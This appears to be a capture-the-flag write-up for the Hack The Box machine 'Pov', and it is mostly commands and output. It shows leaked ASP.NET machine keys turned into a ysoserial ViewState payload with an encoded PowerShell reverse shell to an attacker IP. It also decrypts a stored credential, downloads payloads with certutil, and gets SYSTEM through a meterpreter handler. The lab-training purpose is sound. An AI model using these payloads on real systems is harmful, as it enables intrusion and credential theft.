# Pov Write-up

<img src="https://labs.hackthebox.com/storage/avatars/a36f80aa6bc43863512ec9537c4366c9.png" width="200" height="200">

## Nmap

`nmap -sC -sV 10.10.11.251`    

    PORT   STATE SERVICE VERSION
    80/tcp open  http    Microsoft IIS httpd 10.0
    |_http-title: pov.htb
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

## Gobuster

`gobuster vhost -u http://pov.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain -r`

![image](https://github.com/zer00d4y/writeups/assets/128820441/dbd818e4-3398-4f93-8269-6214cb804141)


Add `pov.htb` and `dev.pov.htb` to `/etc/hosts`

dev.htb

![image](https://github.com/zer00d4y/writeups/assets/128820441/99fc9c1e-e102-4587-a047-199594a5d9f1)

dev.pov.htb/portfolio/

![image](https://github.com/zer00d4y/writeups/assets/128820441/de073050-accf-4dc1-ac19-7a80106fe5a2)

![image](https://github.com/zer00d4y/writeups/assets/128820441/fa441f07-ed9c-44d2-939a-e5c6b0c7b187)

![image](https://github.com/zer00d4y/writeups/assets/128820441/b54a57ad-3b80-4184-9f8d-8e1cd6727dba)

try change `cv.pdf` to `/web.config`

![image](https://github.com/zer00d4y/writeups/assets/128820441/70aa1427-c3c1-4460-a79f-7c4a3e84c7f8)

web.config

    <configuration>
      <system.web>
        <customErrors mode="On" defaultRedirect="default.aspx" />
        <httpRuntime targetFramework="4.5" />
        <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
      </system.web>
        <system.webServer>
            <httpErrors>
                <remove statusCode="403" subStatusCode="-1" />
                <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
            </httpErrors>
            <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
        </system.webServer>
    </configuration>

on windows, download ysoserial.exe and generate payload

https://github.com/pwntester/ysoserial.net

https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip

![image](https://github.com/zer00d4y/writeups/assets/128820441/a714f91b-6de8-4c86-ab8b-f35c5e13ab66)

    ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOQAxACIALAA0ADIANAAyACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"

![image](https://github.com/zer00d4y/writeups/assets/128820441/10782299-a32f-45c9-9a80-aba2ad8c0c19)

    Bo%2BRSF7ytwjuN%2FKohlWbmLxb3gt8MhPB1mNMwLtej3i88reQa%2ByhOXJkI0DDs4qrVx6m3fkvHCPOnJc%2BzjwrGkIrBSEc%2F5yEtJtGaVPxfSghHb%2BnXqKXMLPH2IgklB8%2BOjRigefJkUjSU7e94x1UwOK0FwU4vOim5zCkWtnGv4uEfWuaeBYIr7g4J3BFV9iBAjKQQf9dNL31woSUVaUuiYogCd%2Bm1wOilOZj%2FKa2H3PKTDPZrlxOtXxxC8%2BZzakBoA8ckWwdkiyNgHjym9qef8ZaFEFIs4CyzcPBD4TTJnZQJp0ZK3Sw5k5W2XgfSeqbnzVtSxGVhgWx6BhuvsuH0f6Fc119OcZYy10QrZLdzno9bCRVNeRRSj6jYg2RJavscyK5OeCq9s%2FzyChBB5gpGx4016%2FEc9besMW2LXZedDWC%2Fs%2FVwBFmXFA86cxcNuR4Yn5%2Fw9gDn63Elh8Uq365ace2QsulBnOo1lJLCV%2FezxHCdQE6d3Xg09ZwwmozspNpfE0lOa3I8beJGtwrudHFZ8uEynB5x0GG%2FTCC%2B0hyy9hgVPl7PN6vgDY1feRnDt3fLmxzqqv4%2BLyfr0KS982Sf7h%2Fzq4eOYI40JtbpTXTGa9trFuvK7CxF3eTey7Ed5mBYLahj0EVJbZhaiMm8L9c5FbYYHRjKqwq5yY%2Fi1iftkXCqkYKPNnCpoI56ppMAgqqDOMmGdeou5efZjV6H%2FuNkVxxeEaG5dEf6h340BKuIGReP%2BxJLRA9Ddu5pSQ8co8utq1fCWH%2BVIoiIxGhb0mc29K582NkBCI0wCjH35MPk%2F1tOl6hU8efc91stB4cH3%2BPODXb%2F7e%2FhfGH1qL5dUubaAzdtavts%2FZc34yzmZ%2FWj%2F%2FTXToy7tarbWvGRkNdBZCVvP27ACx7VQpXYT7GpA41oqXZdFValbWqZrZ87VMJxFJ26UMqu4RTg87YYZHnwurt5m9LS9rVVK%2FvU2BfhCQHzPKljRiBvC062a92V%2FT5%2FotD9OZdV50nqT2m8K9FVKlxzaxcPvyi%2B08H8Dvm2HU346IWCufKHte6YyixsoXyUJStCpNhr9ftO%2FhpgkCbSKZl%2BGOlWzjV6QCxgj%2Ba20CeJrfc%2FpI2kbDDrf%2F5fumC0%2FpCc3mv181dKKa0H9oZq4mqzEHb8RkHNFFZyneecU0aKhCFzdM466Su%2Fs3VwVmAzSBLzIklbc53LKIskpWx2ARfh7KhH%2FXgiywelxfqi7l3%2Fm2GYkQo1772FjEIHmaNKLCAN793GyQ8eumj%2F8ZTTgLMelWXgrP5m%2BvQ1ggyZwVODUdQuunRLfA5pNK1w%2BLotKgPb3a%2B5xWtCnzWgSb45qkJcSnm7XP9mmpMcTKIXog1vl673UEIuAE0aespso0QEdfMJxNcp%2FgEi8nwA7Cjo4DyCSTptg3YeBQZLnQYXAkfg87z6Y5MgWjgQbFyDfYJXsxvnqNO2Oy7pIX823Fbto8TiEuTmqNPOnLr51zQgqH9g6brSjKbl0R8NXUvVQseLcb%2Fp3E2nW9wLNjiNeYgHvGCOvMlk8yW655s%2Flp0HWaHmSjtz36JQyM5hRo5BRLr5UqkhTZTp%2FNJEacZItJDy6Ts2wNU94Xrcsm3F79BrmFvKUGByc40xb6KH1WuR0QSIrG7FRgucRra7vRJRewVMqR3bqXA6HNNLJvWYxnKI3JAQqInqu9OWGEUai59LJwGLSUU0c3kOxkmnBgKYNeDjANyZCd2IshGvgJqKgVwblPOJjMx%2Bz8bbFq2WBN456i2Yyap8N8idlppYDlXasBqtvp%2F5Q%2Fsv6bMTsFZjKv7dT14l5vMkfuKGgS8sXK%2FdPx3gn6uohPC2HNS4n1imjJYFKsffyicqs3rHUTj5UEUWSJ1XyxFURSeWVo6yVdlgObl0C5nN04VGHnEQrCrBKxlK2B2y7NHs9JHZwOEOSfJJy3fFGaZ6xGJR0xBfbJrVo4NqtBwKd4aRLoCdR0KX39NVCQm55nDHhTqD8Hx%2FsDwN7tdOKo44inMoQYNdFxag5D28q3YKwRO2Mo5eFrF0GeEKh8m3b9IYJleV9gmMC4Dj3iZ8hmH%2Fw6QHVdvEgjMVPR%2BgLRYvXKYxSt3X3mFkiIKA8wV3tYB5ISSKK0XfDHIMyvRhtnNM17%2BgewmlzDyKXj6qkedMvzg7WMWluIksCz8pGRbWiKqueLDTsFs%2Brozb%2F%2B3hLx320lqX%2B7%2BCwKYVD8J6vyKTRUlmu8lFGGTSFzB%2FngQlJ3Av0EkN3Ouj%2FTA37hrR%2Bn%2FhkTCvEjbRydKyJDJ8%2BGhia%2BRBTv3YFJvFWvMUW%2FKJ%2BQuufm3NwW5RcnPj5hvZYbOA5kLHwa3lIhT8wcIlaH78QYAOha6%2BH9oNFnPE8fW9OayB8bDRPWtExgyzG3k1yRMTcczvqB3Xv%2Bmd%2BxjDG0JxKrc9U06XzRChGdmCZbQD6HqZja9iTH2D8B8zxnxYos7mNmaAgLpocudmwlD4hgX5WAUgxvzf7nXRML4GDwzp4RKoT6%2Fnfobx0xASHpfTw3flS9QL9jr4rWn%2FVqXDp%2FXM1aMoz3SBvzkLQmGkV3uTYSdULZJ8uIxhlhYqnlMVhSzvYlu%2FgxlPbnImldTpeGZj8DGVIKyOeEE%2F5wepEOn5s5Xj0di2cnbD9ue%2FbmIVxTgkgRBiJjbPi%2FvbbKq3y6uKlMVNpdxoY9WNPRdGvupd5PCdl2TTqTL%2BYgK%2FdL%2B8FqNtbIg427wHa7f7uujq%2FYOsQyaznvKcI3k8FFz4jfmg1xrCp0LwRFCsCMaHsNOLT5PZrYUfF7T702ah2QmYCO7E2PwWctO8cjQBH7r8FCwscwZyDbUEPB2AGxhhUieTe5d1mF%2FLJfIhSGWrgI%2F7xfzO%2B4HPmDyaPHDvtS9xXId2ViA2f9R%2Bx5owthaSJ18d9iDvW4Vy0x25qJ%2BCB8Y%2Fi8OM%2FCdfzBOrXgT54Yxp%2FQFkVLTh%2FEQz%2F4u9QPWpzRVhUReOYbNwdArE5zix%2BlfPX9nk4wa27j6VLZx1U2PHBd265IXGqNnbRBa7VMigVfxbYswqHleFzOfPmC8Fp3%2BNw%2BAABrjoBBoJ1%2FHb9rtjy1GFylT7qSVSrCvI3StXamYQOU%2FeiH5VnhKWVxzb%2FOODWgAdurCyHfUYiuL8mLOsO3OpD2dSS4YYkoZjuJCwAmKn3XjjE3BvhR03M2VwNZqr18z4iNYMvhwvNNm6ZSCiPF5T3GYbZhNg4BPpupRPHb%2FcqlevdJajxaTJogwLSnhgMqOtCx2bwCo09gwwjQQzfm2%2FJS6H5So0qJBobt0oz1Rrqma%2FhIYZ%2Be3%2F%2FtEh4Kd2KFmJSsSPwo7FGOh8bhxNTC7RGe0E80RZMonbWZpH4fv6MFVcPuFV5gZLRyJwWphjTVZLLBl3qW9%2F5Z14GdykrKzHAUIOHbRSqMSzS1kHuXvld0X3nuwD1IZCOzmt1WkLWajPjR98lYtvkgwwyB34GkKOV5OvP3W4KZxAQ8HbH7n06HrqUA2Q8%2FcWZ%2BGUOoE7x0CRF%2FQ9tu4XSiGhjdJhmwrYbXpxzezE5sQeC%2BQuzxBNZHpDAd235dcmkTBeoP0CjyaJul4AGb04DSCQQkPdNrZTSMApxSgyiICb3boUMRH8ZICzN4yHDPvKFdq5J%2BsU6xeS4TraXaNN7%2BdELW1OJ%2FLf0xraNQH4pcuqEINsA8yx9R0sWkGaWMJoJMnq8101T%2Fiag2VzQiQiA1TGmFZmUln%2BQtK1CNKtIm1kx8K%2F09zdtvzwFGS64CTD1X%2BIHk2pPEOed%2BgGCxWcMFGLM%2F%2F9lB2HYzRdeKhA1v3LRebWNT6gZjMk%2Bn3s9fTXofvnGun0OH8Q5jfZRx8ni7hJ4MRrjufOZAe3ycdGLecWKsBvihI54kvQWHyyG3hT8DITBaOSq2pYypTEVEU%2BBmQ2mYf51G7VGTp0DEvWnzDfjus94IpBR4EDRJbX9zt%2BdJ0vqb7skwBbwM9yrz3zup0LTU5Lv%2F1X0hSKcmaKV0EktjHqz9Juddsq6lQPRcsAS2Y82y0ISYkhtfJK5Hn%2BkYMhUSKpd94SN5UldAx6FrWEzymei5E60nONjWY14suZp772jyrNg6Q5VSbsVfLN9SV%2FYPEMof1JC2tya5jhJtbBOr9kN2AnulCtsShfub2u0Wrs3YeDYFrpCjhPS55MV4WY3fd8CINT0yN0LVqiH2MfqZvzctrR6b1fPZ2jW%2F7GzrP4G10%2FhTey5Yb6%2BmjIDmPLwyCRKFoULsqwIU%2FNJZWvvU5IItN%2F2bsk2UFZ4AMI7330gnObLxChWxs9fxuju9vw1SzjpxTDCpMwWdI3bJon9TsuKn2JWdWRV6YO6GO7LzeC2b%2B%2F%2FQc7qtz%2B4ewQEiZdPxa6m%2Bb8zntrHvv0y6p%2BdhdZcQAhnOYtXH5yi63IiBR1EScb52alj7JWnbXwBt7cBnjeqDhNQ4GTje7UHJcvEGtl8RIujh%2BAVNmxFDiHLSXMZyQ802m5VVkA4aCyz3xABjcvPMLS1Llv5iIZlyAvLU9%2Bt2pob3LjFB04LS%2B6fcttgc5cVKci4qKAHGVBFqHEEcSEltHi%2Bi8g3HME%2FVhKdt1W9dYs88wtkqtdmTbJDWjmtRypss96Zw9Z%2BJvjjBsYBn0WUB%2F%2BVy2u5C6DZscu6cOpMJIavyATNCZxV6a%2F2tesg0tDWIAdyWxMdL9aSdualYMzji%2BmYpjlb1aO%2F9elxMNJGNr04cIz%2B6UFujrDtMUjjxg6orPIdGRw1eojFYOuitLDycV0q8uLc4KNnqEpDPr4oDF71Feby5sHKlfoownJPlW77tVnQPv8l1EIqGiF1axwb7XeIo9421%2F0piJLndUKc1OnDG7SlCgH492iZn%2Fb79X8gS9NnJC
        
![image](https://github.com/zer00d4y/writeups/assets/128820441/d411f448-133a-4e8f-a0fa-814f302ad728)

![image](https://github.com/zer00d4y/writeups/assets/128820441/a0b18639-8b8d-45be-9e4a-216b2b683056)

![image](https://github.com/zer00d4y/writeups/assets/128820441/68a2e899-c978-43a1-abdd-a91da84239a9)
    
`alaading`:`01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6`        

    echo 01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6 > pass.txt
    
    $EncryptedString = Get-Content .\pass.txt
    
    $SecureString = ConvertTo-SecureString $EncryptedString
    
    $Credential = New-Object System.Management.Automation.PSCredential -ArgumentList "username",$SecureString
    
    echo $Credential.GetNetworkCredential().password

![image](https://github.com/zer00d4y/writeups/assets/128820441/d466b66f-744e-4cb7-af85-c9099ecb84bc)

    f8gQ8fynP44ek1m3

![image](https://github.com/zer00d4y/writeups/assets/128820441/6ff3b858-ee47-4476-abf2-4564bcc51a98)

    $username = 'alaading'
    
    $password = 'f8gQ8fynP44ek1m3'
    
    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
    
    $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
    
    Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock {powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOQAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAAHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==}

![image](https://github.com/zer00d4y/writeups/assets/128820441/fad9c9e6-fd04-4548-ad09-4af7b6835350)

![image](https://github.com/zer00d4y/writeups/assets/128820441/b31bc1cf-a9e9-4a28-b730-818d2908f25c)

Get the user flag 

![image](https://github.com/zer00d4y/writeups/assets/128820441/e0bcd10b-a6c0-4784-810f-328592872f2e)

## Privilege Escalation

![image](https://github.com/zer00d4y/writeups/assets/128820441/80ca120f-2dcf-4c8c-a076-755cf606a745)

https://github.com/antonioCoco/RunasCs

https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip

`unzip RunasCs.zip`

![image](https://github.com/zer00d4y/writeups/assets/128820441/5a39f3bd-10ae-4060-9d9b-a4f2728b2a4d)

Start python server 

![image](https://github.com/zer00d4y/writeups/assets/128820441/f5232d76-f258-4dc9-9317-03d90ada980c)

`msfconsole`

    use multi/handler
    
    set payload windows/x64/meterpreter/reverse_tcp 
    
    set lhost tun0
    
    set lport 4246
    
    run

![image](https://github.com/zer00d4y/writeups/assets/128820441/d8071c38-122b-4e16-931e-8bbb7a79e803)

    certutil -urlcache -f http://10.10.14.91:8081/exploit.exe exploit.exe

![image](https://github.com/zer00d4y/writeups/assets/128820441/ef3ad104-778b-4e63-addc-d09b1616a877)

    certutil -urlcache -f http://10.10.14.91:8081/RunasCs.exe RunasCs.exe 

![image](https://github.com/zer00d4y/writeups/assets/128820441/3231e006-d4c2-4c7e-888b-1260aaa7f77a)

    .\RunasCs.exe alaading f8gQ8fynP44ek1m3 "C:\\Users\\alaading\\Desktop\\exploit.exe"

![image](https://github.com/zer00d4y/writeups/assets/128820441/81d5fc47-4e16-4880-bcb6-936cb1e9c6a1)

Check winlogon.exe PID 

![image](https://github.com/zer00d4y/writeups/assets/128820441/75b7144b-f3a7-41ea-80d0-65c4233461ab)

migrate process

![image](https://github.com/zer00d4y/writeups/assets/128820441/36cc1d0d-3d33-4a38-af0c-e39d72a14250)

Get the root flag

![image](https://github.com/zer00d4y/writeups/assets/128820441/6fc34194-ebf8-4633-b89f-7d368ae3991d)


